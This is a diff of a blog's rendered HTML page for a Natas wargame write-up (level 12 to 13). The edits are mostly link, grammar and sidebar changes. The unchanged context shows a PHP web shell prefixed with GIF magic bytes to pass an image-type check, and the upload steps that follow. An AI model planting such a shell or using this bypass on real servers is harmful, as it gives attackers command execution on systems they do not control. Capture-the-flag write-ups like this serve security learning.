@@ -12,8 +12,8 @@
     <link rel="icon" href="/favicon.ico?" type="image/x-icon">
     <link rel="stylesheet" href="https://cdnjs.Cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
     <link rel="stylesheet" href="/assets/css/main.min.css ">
-    <link rel="canonical" href="https://caminek.rocks/2021/05/27/natas12-13/">
-    <link rel="alternate" type="application/rss+xml" title="Caminek" href="https://caminek.rocks/feed.xml ">
+    <link rel="canonical" href="/2021/05/27/natas12-13/">
+    <link rel="alternate" type="application/rss+xml" title="Caminek" href="/feed.xml ">
     
     <!-- Begin Jekyll SEO tag v2.7.1 -->
 <title>Natas Level 12 → Level 13 | Caminek</title>
@@ -22,15 +22,15 @@
 <meta property="og:locale" content="en_US" />
 <meta name="description" content="Filter jilter" />
 <meta property="og:description" content="Filter jilter" />
-<link rel="canonical" href="https://caminek.rocks/2021/05/27/natas12-13/" />
-<meta property="og:url" content="https://caminek.rocks/2021/05/27/natas12-13/" />
+<link rel="canonical" href="/2021/05/27/natas12-13/" />
+<meta property="og:url" content="/2021/05/27/natas12-13/" />
 <meta property="og:site_name" content="Caminek" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2021-05-27T11:47:18-04:00" />
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="Natas Level 12 → Level 13" />
 <script type="application/ld+json">
-{"@type":"BlogPosting","description":"Filter jilter","headline":"Natas Level 12 → Level 13","dateModified":"2021-05-27T11:47:18-04:00","datePublished":"2021-05-27T11:47:18-04:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://caminek.rocks/2021/05/27/natas12-13/"},"url":"https://caminek.rocks/2021/05/27/natas12-13/","@context":"https://schema.org"}</script>
+{"@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/2021/05/27/natas12-13/"},"description":"Filter jilter","headline":"Natas Level 12 → Level 13","dateModified":"2021-05-27T11:47:18-04:00","url":"/2021/05/27/natas12-13/","datePublished":"2021-05-27T11:47:18-04:00","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -202,20 +202,20 @@
 <h2 id="solution">Solution</h2>
 <p>The natas12 website allows us to select and upload an image, and view the page source. This time it claims it will only accept image files.  Since the source is now starting to get a bit longer, I’ll highlight the pertinent line(s) below.</p>
 
-<p>Server side code:</p>
+<p>Server-side code:</p>
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nb">exif_imagetype</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'uploadedfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">]))</span> <span class="p">{</span>
     <span class="k">echo</span> <span class="s2">"File is not an image"</span><span class="p">;</span>
 </code></pre></div></div>
 
-<p>Client side code:</p>
+<p>Client-side code:</p>
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"filename"</span> <span class="na">value=</span><span class="s">"&lt;? print genRandomString(); ?&gt;.jpg"</span> <span class="nt">/&gt;</span> 
 </code></pre></div></div>
 
-<p>Here we see the same method of client-side renaming used in the last level. The site author has also updated the code to include a server-side EXIF data check to try and ensure the data sent is a valid image file. Since we have no control over the server side, we’ll need to trick the code into accepting our php script once again.  This time, we’ll need to embed the <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">Magic Bytes</a> for an valid image file into our script.</p>
+<p>Here we see the same method of client-side renaming used in the last level. The site author has also updated the code to include a server-side EXIF data check to try and ensure the data sent is a valid image file. Since we have no control over the server-side, we’ll need to trick the code into accepting our php script once again.  This time, we’ll need to embed the <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">Magic Bytes</a> for a valid image file into our script.</p>
 
 <p>There are several ways to go about adding the magic bytes: you can write a small script in python (or another language) to create the file and embed the hex characters, you can use a hex editor to prepend the hex bytes to the shell.php file from the last level, or you can copy the text characters, not the hex characters and paste them into shell.php with your favorite editor.</p>
 
-<p>Initially I tried to use the text characters for jpg but was unsuccessful. Looking at the hex output I could see that the characters were wrong. I’m not sure if that was an issue with vim or not. I opted to go for another image type without unicode character in it. Below is the copy/paste solution using GIF:</p>
+<p>Initially, I tried to use the text characters for jpg but was unsuccessful. Looking at the hex output I could see that the characters were wrong. I’m not sure if that was an issue with vim or not. I opted to use GIF instead since it didn’t contain any Unicode characters.</p>
 
 <p>shell.php</p>
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">GIF89a</span><span class="o">:</span> <span class="o">&lt;?</span> <span class="nb">passthru</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"cmd"</span><span class="p">]);</span> <span class="cp">?&gt;</span>
@@ -232,9 +232,9 @@
 
 <p>The last line is the one we’re looking for. The name of the file, <strong>upzknql2yq</strong> will be different for you. Change the extension from .jpg to .php using the developer tools. Do not refresh the page or use the browser navigation buttons, or you’ll need to change the extension once again.</p>
 
-<p>With the extension now changed, click on the browse button, select shell.php and then click upload.</p>
+<p>With the extension now changed, click on the browse button, select shell.php, and then click upload.</p>
 
-<p>You shoud see a message similar to the following:</p>
+<p>You should see a message similar to the following:</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The file upload/zidcnm44f9.php has been uploaded
 </code></pre></div></div>
 
@@ -295,6 +295,14 @@
                      <!--for loop is 0 based. this prevents off-by-one errors -->
                     
 
+                    
+                        
+
+                        
+                    
+                        
+
+                        
                     
                         
 
@@ -658,15 +666,15 @@
                 </div>
                 <ul class="content-ul" recent>
                     
+                        <li><a href="/2021/05/31/natas26-27/">Natas Level 26 → Level 27</a></li>
+                    
+                        <li><a href="/2021/05/31/natas25-26/">Natas Level 25 → Level 26</a></li>
+                    
                         <li><a href="/2021/05/30/natas24-25/">Natas Level 24 → Level 25</a></li>
                     
                         <li><a href="/2021/05/30/natas23-24/">Natas Level 23 → Level 24</a></li>
                     
                         <li><a href="/2021/05/30/natas22-23/">Natas Level 22 → Level 23</a></li>
-                    
-                        <li><a href="/2021/05/30/natas21-22/">Natas Level 21 → Level 22</a></li>
-                    
-                        <li><a href="/2021/05/30/natas20-21/">Natas Level 20 → Level 21</a></li>
                     
                 </ul>
             </div>
@@ -702,7 +710,7 @@
                             <span class="name">
                                 ctf
                             </span>
-                            <span class="badge">66</span>
+                            <span class="badge">68</span>
                         </a>
                     </li>
                     
@@ -711,7 +719,7 @@
                             <span class="name">
                                 wargames
                             </span>
-                            <span class="badge">61</span>
+                            <span class="badge">63</span>
                         </a>
                     </li>
                     
@@ -729,7 +737,7 @@
                             <span class="name">
                                 web-security
                             </span>
-                            <span class="badge">26</span>
+                            <span class="badge">28</span>
                         </a>
                     </li>
                     
